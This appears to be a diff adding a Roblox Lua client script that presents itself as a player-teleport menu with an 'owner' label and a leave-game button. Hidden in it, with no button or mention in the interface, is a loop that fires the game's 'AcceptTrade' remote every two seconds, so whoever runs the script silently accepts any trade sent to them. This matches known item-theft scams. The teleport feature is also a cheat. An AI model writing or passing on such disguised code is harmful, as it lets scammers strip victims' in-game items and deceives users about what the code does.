@@ -1,0 +1,126 @@
+-- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- UI
+local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+ScreenGui.Name = "TeleportGui"
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 260, 0, 350)
+MainFrame.Position = UDim2.new(0, 50, 0.5, -175)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.ClipsDescendants = true
+MainFrame.AnchorPoint = Vector2.new(0, 0.5)
+
+-- UICorner for rounded edges
+local corner = Instance.new("UICorner", MainFrame)
+corner.CornerRadius = UDim.new(0, 10)
+
+-- OWNER Label
+local OwnerLabel = Instance.new("TextLabel", MainFrame)
+OwnerLabel.Size = UDim2.new(1, -20, 0, 35)
+OwnerLabel.Position = UDim2.new(0, 10, 0, 10)
+OwnerLabel.BackgroundTransparency = 1
+OwnerLabel.Text = "👑 OWNER: JAKE MELISSA"
+OwnerLabel.TextColor3 = Color3.fromRGB(255, 215, 0) -- Gold color
+OwnerLabel.Font = Enum.Font.GothamBold
+OwnerLabel.TextSize = 18
+OwnerLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Layout
+local UIListLayout = Instance.new("UIListLayout", MainFrame)
+UIListLayout.Padding = UDim.new(0, 6)
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+OwnerLabel.LayoutOrder = 0
+
+-- Padding
+local UIPadding = Instance.new("UIPadding", MainFrame)
+UIPadding.PaddingTop = UDim.new(0, 10)
+UIPadding.PaddingLeft = UDim.new(0, 10)
+UIPadding.PaddingRight = UDim.new(0, 10)
+
+-- Button generator
+local function makeButton(text)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, 0, 0, 32)
+    btn.Text = text
+    btn.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+    btn.TextColor3 = Color3.fromRGB(200, 200, 255)
+    btn.Font = Enum.Font.Gotham
+    btn.TextSize = 16
+    btn.BorderSizePixel = 0
+
+    local corner = Instance.new("UICorner", btn)
+    corner.CornerRadius = UDim.new(0, 6)
+
+    local stroke = Instance.new("UIStroke", btn)
+    stroke.Color = Color3.fromRGB(50, 100, 255)
+    stroke.Thickness = 1
+
+    btn.Parent = MainFrame
+    return btn
+end
+
+-- Teleport function (face same direction)
+local function teleportToPlayer(targetPlayer)
+    local myChar = LocalPlayer.Character
+    local targetChar = targetPlayer.Character
+    if myChar and targetChar then
+        local myHRP = myChar:FindFirstChild("HumanoidRootPart")
+        local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
+        if myHRP and targetHRP then
+            myHRP.CFrame = targetHRP.CFrame
+        end
+    end
+end
+
+-- Create teleport buttons for players
+local function addTeleportButton(plr)
+    if plr ~= LocalPlayer then
+        local btn = makeButton("📍 Teleport to " .. plr.Name)
+        btn.MouseButton1Click:Connect(function()
+            teleportToPlayer(plr)
+        end)
+    end
+end
+
+for _, plr in ipairs(Players:GetPlayers()) do
+    addTeleportButton(plr)
+end
+
+Players.PlayerAdded:Connect(addTeleportButton)
+
+-- Auto-accept trade (update remote path if needed)
+local function autoAcceptTrade()
+    local success, remote = pcall(function()
+        return ReplicatedStorage:FindFirstChild("Remotes"):FindFirstChild("AcceptTrade")
+    end)
+    if success and remote and remote:IsA("RemoteEvent") then
+        remote:FireServer()
+        print("✅ Auto accepted trade.")
+    else
+        warn("⚠️ AcceptTrade remote not found.")
+    end
+end
+
+-- Leave button
+local leaveBtn = makeButton("❌ Leave Game")
+leaveBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
+leaveBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
+leaveBtn.MouseButton1Click:Connect(function()
+    game:Shutdown()
+end)
+
+-- Periodic auto-accept trade
+task.spawn(function()
+    while true do
+        pcall(autoAcceptTrade)
+        task.wait(2)
+    end
+end)
